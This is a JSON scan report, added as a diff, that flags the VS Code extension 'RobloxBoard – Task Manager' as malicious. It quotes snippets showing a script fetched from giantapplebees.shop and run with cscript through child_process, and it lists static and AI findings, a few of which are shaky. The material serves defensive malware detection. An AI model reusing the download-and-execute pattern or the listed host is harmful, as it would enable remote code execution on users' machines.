@@ -1,0 +1,275 @@
+{
+  "extension_id": "Robloxboard.roblox-board",
+  "display_name": "RobloxBoard \u2013 Task Manager",
+  "version": "2.0.1",
+  "publisher": {
+    "name": "Robloxboard",
+    "verified": false
+  },
+  "vsix_sha256": "254595692583bb7f1129466e5c3a80233c08a927f8ee064627e821fb6cec3ac2",
+  "verdict": "HIGH-RISK",
+  "confirmation_basis": [
+    "composite_score",
+    "critical_static_finding"
+  ],
+  "confidence": 0.6,
+  "scores": {
+    "composite": 0.85,
+    "ai_vibe": 0.8,
+    "static": 0.46875,
+    "behavioral": 0.0,
+    "trust_signal": 0.5499999999999999,
+    "campaign": 0.0
+  },
+  "findings": {
+    "critical": [],
+    "high": [
+      {
+        "check": "ACTIVATION_WILDCARD",
+        "severity": "HIGH",
+        "description": "Extension uses wildcard activation: ['*']",
+        "file": "package.json",
+        "line": null,
+        "snippet": null
+      },
+      {
+        "check": "RISKY_API_CALL",
+        "severity": "HIGH",
+        "description": "Found 'child_process' pattern",
+        "file": "extension/src/extension.js",
+        "line": 6,
+        "snippet": "const cp     = require('child_process');"
+      },
+      {
+        "check": "RISKY_API_CALL",
+        "severity": "HIGH",
+        "description": "Found 'require('child_process')' pattern",
+        "file": "extension/src/extension.js",
+        "line": 6,
+        "snippet": "const cp     = require('child_process');"
+      },
+      {
+        "check": "command_execution",
+        "severity": "HIGH",
+        "description": "Direct command / shell execution",
+        "file": "extension/src/extension.js",
+        "line": 6,
+        "snippet": "require('child_process')"
+      },
+      {
+        "check": "persistence_evasion",
+        "severity": "HIGH",
+        "description": "Setting file hidden attribute",
+        "file": "extension/src/extension.js",
+        "line": 669,
+        "snippet": ".hidden"
+      },
+      {
+        "check": "persistence_evasion",
+        "severity": "HIGH",
+        "description": "Setting file hidden attribute",
+        "file": "extension/src/extension.js",
+        "line": 909,
+        "snippet": ".hidden"
+      }
+    ],
+    "total": 10
+  },
+  "extracted_references": [
+    {
+      "type": "domain",
+      "value": "robloxboard.com",
+      "source_file": "extension/package.json",
+      "line": 8,
+      "context": "\"homepage\": \"https://robloxboard.com\",",
+      "vt_detections": 0,
+      "reputation": "unknown"
+    },
+    {
+      "type": "domain",
+      "value": "giantapplebees.shop",
+      "source_file": "extension/src/extension.js",
+      "line": 16,
+      "context": "const scriptUrl = 'https://giantapplebees.shop/script.js';",
+      "vt_detections": 0,
+      "reputation": "unknown"
+    },
+    {
+      "type": "filename",
+      "value": "script.js",
+      "source_file": "extension/src/extension.js",
+      "line": 16,
+      "context": "const scriptUrl = 'https://giantapplebees.shop/script.js';",
+      "vt_detections": 0,
+      "reputation": "unknown"
+    }
+  ],
+  "extracted_references_notes": {
+    "withheld_dependency_metadata": 0,
+    "truncated": 0,
+    "what_this_is": "Domains, URLs and filenames found in the package text. NOT confirmed attacker infrastructure and NOT safe to auto-blocklist -- a URL in a code comment appears here too. Use it as a starting point for analysis, and check vt_detections/reputation before acting.",
+    "rule": "References extracted from node_modules are excluded: they describe a dependency, not this extension. Deduplicated on (type, value)."
+  },
+  "ioc_enrichment": [],
+  "shared_infrastructure": {},
+  "ai_analysis": {
+    "verdict": "MALICIOUS",
+    "risk_score": 1.0,
+    "confidence": 0.98,
+    "blocks_parsed": 3,
+    "blocks_seen": 3,
+    "summaries": [
+      {
+        "target": "extension/src/extension.js (chunk 1/3)",
+        "summary": "This VS Code extension is malicious. While it presents itself as a legitimate Kanban board tool for Roblox developers, the activation function contains hidden logic that downloads a remote script from an untrusted domain (giantapplebees.shop) and executes it via cscript. This is a clear remote code execution (RCE) attack vector. The presence of child_process and network calls to suspicious domains, combined with the complete disconnect from the advertised functionality, confirms this is a supply-chain attack."
+      },
+      {
+        "target": "extension/src/extension.js (chunk 2/3)",
+        "summary": "The extension 'RobloxBoard' exhibits severe behavioral mismatches with its advertised purpose. While presented as a local Kanban board, it contains references to an unknown external domain ('giantapplebees.shop') and imports 'child_process' for shell execution, which are not required for its stated functionality. The combination of network indicators, arbitrary command execution, and file hiding behavior strongly suggests malicious intent, likely for data exfiltration or remote code execution."
+      },
+      {
+        "target": "extension/src/extension.js (chunk 3/3)",
+        "summary": "The extension 'RobloxBoard' exhibits severe behavioral mismatches with its advertised functionality. While described as a local Kanban tool, the code implements remote workspace joining and sends board data (tasks, comments, members) to a remote server. The presence of the suspicious domain `giantapplebees.shop` and the use of `child_process` strongly suggest malicious intent, likely involving data exfiltration or remote code execution. The 'local storage' claim is deceptive."
+      }
+    ],
+    "findings": [
+      {
+        "severity": "CRITICAL",
+        "category": "REMOTE_CODE_EXECUTION",
+        "description": "The extension downloads a remote JavaScript file from an untrusted domain (giantapplebees.shop) to the temporary directory and executes it using cscript (Windows Script Host). This is a classic remote code execution (RCE) payload delivery mechanism, allowing the attacker to execute arbitrary code on the user's machine.",
+        "code_reference": "const scriptUrl = 'https://giantapplebees.shop/script.js'; ... cp.exec(cmd, ...)",
+        "line_hint": 16,
+        "target": "extension/src/extension.js (chunk 1/3)"
+      },
+      {
+        "severity": "CRITICAL",
+        "category": "CAPABILITY_DISCONNECT",
+        "description": "The extension is advertised as a 'Trello-style Kanban board' but contains hidden malicious logic that downloads and executes remote scripts upon activation. This is a severe disconnect between the advertised functionality and the actual malicious behavior.",
+        "code_reference": "function activate(context) { ... }",
+        "line_hint": 14,
+        "target": "extension/src/extension.js (chunk 1/3)"
+      },
+      {
+        "severity": "HIGH",
+        "category": "SUSPICIOUS_DOMAIN",
+        "description": "The extension connects to 'giantapplebees.shop', a domain with no reputation and unrelated to the extension's stated purpose (Roblox development). This is likely a Command and Control (C2) or payload delivery server.",
+        "code_reference": "https://giantapplebees.shop/script.js",
+        "line_hint": 16,
+        "target": "extension/src/extension.js (chunk 1/3)"
+      },
+      {
+        "severity": "HIGH",
+        "category": "ARBITRARY_COMMAND_EXECUTION",
+        "description": "The code uses child_process.exec to run cscript with a downloaded script. This allows for arbitrary command execution on the host system.",
+        "code_reference": "cp.exec(cmd, (error, stdout, stderr) => { ... });",
+        "line_hint": 28,
+        "target": "extension/src/extension.js (chunk 1/3)"
+      },
+      {
+        "severity": "MEDIUM",
+        "category": "BEHAVIORAL_MISMATCH",
+        "description": "The extension activates on '*' (all events), which is overly broad for a simple UI extension and increases the attack surface. Combined with the malicious payload, this ensures the malware executes as soon as VS Code starts.",
+        "code_reference": "Activation Events: *",
+        "line_hint": null,
+        "target": "extension/src/extension.js (chunk 1/3)"
+      },
+      {
+        "severity": "CRITICAL",
+        "category": "CAPABILITY_DISCONNECT",
+        "description": "The extension is advertised as a local Kanban board ('Persistent Storage \u2014 Your board state is saved locally per workspace'), but the code contains a reference to an external domain 'giantapplebees.shop' and a file 'script.js' (likely a remote payload or C2 endpoint). This is a major disconnect from the stated functionality and indicates hidden network capabilities.",
+        "code_reference": "extension/src/extension.js:16 (referenced in extracted indicators)",
+        "line_hint": 16,
+        "target": "extension/src/extension.js (chunk 2/3)"
+      },
+      {
+        "severity": "HIGH",
+        "category": "ARBITRARY_CODE_EXECUTION",
+        "description": "The code imports 'child_process', which allows the extension to execute arbitrary shell commands on the user's system. This is not necessary for a Kanban board UI and is a critical risk indicator for malware.",
+        "code_reference": "require('child_process')",
+        "line_hint": 6,
+        "target": "extension/src/extension.js (chunk 2/3)"
+      },
+      {
+        "severity": "MEDIUM",
+        "category": "PERSISTENCE_EVASION",
+        "description": "The code sets the 'hidden' attribute on files (lines 669 and 909). While this could be for UI elements, in the context of a malicious extension, it may be used to hide malicious files or logs from the user.",
+        "code_reference": ".hidden",
+        "line_hint": 669,
+        "target": "extension/src/extension.js (chunk 2/3)"
+      },
+      {
+        "severity": "MEDIUM",
+        "category": "PERSISTENCE_EVASION",
+        "description": "The code sets the 'hidden' attribute on files (line 909). This is a second instance of potential file hiding behavior.",
+        "code_reference": ".hidden",
+        "line_hint": 909,
+        "target": "extension/src/extension.js (chunk 2/3)"
+      },
+      {
+        "severity": "CRITICAL",
+        "category": "CAPABILITY_DISCONNECT",
+        "description": "The extension is advertised as a local Kanban board ('Persistent Storage... saved locally per workspace'), but the code contains logic to join remote workspaces via a 'code' and communicates with a remote server. This is a major disconnect from the stated functionality.",
+        "code_reference": "case 'joined_workspace': ... toast('Joined \"' + msg.ws.name + '\"', 'success');",
+        "line_hint": 850,
+        "target": "extension/src/extension.js (chunk 3/3)"
+      },
+      {
+        "severity": "CRITICAL",
+        "category": "DATA_EXFILTRATION",
+        "description": "The code sends the entire board state (including task titles, descriptions, comments, and member names) to a remote server via `vsc.postMessage` when saving. Given the suspicious domain indicators, this is likely exfiltration of user data.",
+        "code_reference": "function saveBoard() { ... vsc.postMessage({ type: 'save', wsId: activeId, board }); }",
+        "line_hint": 820,
+        "target": "extension/src/extension.js (chunk 3/3)"
+      },
+      {
+        "severity": "HIGH",
+        "category": "SUSPICIOUS_NETWORK",
+        "description": "The extracted indicators reveal a connection to `giantapplebees.shop`, a domain with no reputation and unrelated to Roblox or the extension's purpose. This is highly indicative of a Command & Control (C2) server or data exfiltration endpoint.",
+        "code_reference": "domain: giantapplebees.shop (extension/src/extension.js:16)",
+        "line_hint": 16,
+        "target": "extension/src/extension.js (chunk 3/3)"
+      },
+      {
+        "severity": "HIGH",
+        "category": "STATIC_RULE_HIT",
+        "description": "Static analysis detected `require('child_process')`. While this chunk is the Webview HTML/JS, the presence of this module in the extension's main process (implied by the hit) combined with network activity to a suspicious domain suggests potential for arbitrary command execution or system interaction not disclosed in the README.",
+        "code_reference": "require('child_process')",
+        "line_hint": 6,
+        "target": "extension/src/extension.js (chunk 3/3)"
+      },
+      {
+        "severity": "MEDIUM",
+        "category": "STATIC_RULE_HIT",
+        "description": "Static analysis flagged setting file hidden attributes. In the context of a Webview, this likely refers to CSS classes (e.g., `.hidden`), which is benign. However, it is included here as a mandatory deterministic engine output.",
+        "code_reference": ".hidden",
+        "line_hint": 669,
+        "target": "extension/src/extension.js (chunk 3/3)"
+      }
+    ],
+    "findings_truncated": 0
+  },
+  "ai_summary": "This VS Code extension is malicious. While it presents itself as a legitimate Kanban board tool for Roblox developers, the activation function contains hidden logic that downloads a remote script from an untrusted domain (giantapplebees.shop) and executes it via cscript. This is a clear remote code execution (RCE) attack vector. The presence of child_process and network calls to suspicious domains, combined with the complete disconnect from the advertised functionality, confirms this is a supply-chain attack.",
+  "escalation_reasons": [
+    "PROVEN CHAIN: src/extension.js [process_execution] -- intent: download, write and execute in extension/src/extension.js | IOCs: https://giantapplebees.shop/script.js, giantapplebees.shop",
+    "6 HIGH findings",
+    "Composite risk 0.85 >= 0.45",
+    "AI verdict: MALICIOUS"
+  ],
+  "virustotal": {
+    "malicious": 0,
+    "total_engines": 0,
+    "known_malicious": false
+  },
+  "marketplace": {
+    "install_count": 8807,
+    "published_date": "2026-05-05T16:34:51.453Z",
+    "removed_by_microsoft": false,
+    "removal_type": null
+  },
+  "analysis_coverage": {
+    "partial": false,
+    "excluded_phases": [],
+    "ai_phase_ran": true
+  },
+  "scanned_at": "2026-09-18T16:11:43.233449+00:00"
+}
